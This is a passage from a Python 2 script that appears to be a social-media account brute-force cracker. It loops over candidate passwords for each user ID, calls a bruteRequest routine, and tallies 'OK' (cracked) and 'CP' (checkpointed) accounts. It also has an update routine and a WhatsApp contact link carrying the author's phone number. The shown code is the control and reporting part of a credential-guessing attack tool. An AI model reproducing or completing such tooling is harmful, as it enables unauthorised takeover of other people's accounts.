                print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()


def results(Dapunta, Krahkrah):
    if len(Dapunta) != 0:
        print '\n\n   [OK] : ' + str(len(Dapunta))
    if len(Krahkrah) != 0:
        print '\n\n   [CP] : ' + str(len(Krahkrah))
    if len(Dapunta) == 0 and len(Krahkrah) == 0:
        print '\n'
        print '   [!] No Result Found'


def updatesc():
    os.system('clear')
    banner()
    print '\n   [\xe2\x80\xa2] Updating Script'
    os.system('git pull origin master')
    print '\n   [\xe2\x80\xa2] Update Successful'
    exit()


def wangsaff():
    os.system('clear')
    banner()
    raw_input('\n   [ Contact Dapunta? ]')
    jalan('   [\xe2\x80\xa2] Open Whatsapp...')
    os.system('xdg-open https://wa.me/+6282245780524?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20Premium%20Dapunta.%20Code:%20404')
    raw_input('\n   [ Back ]')
    logs()


if __name__ == '__main__':
    menu()
# global cp ## Warning: Unused global
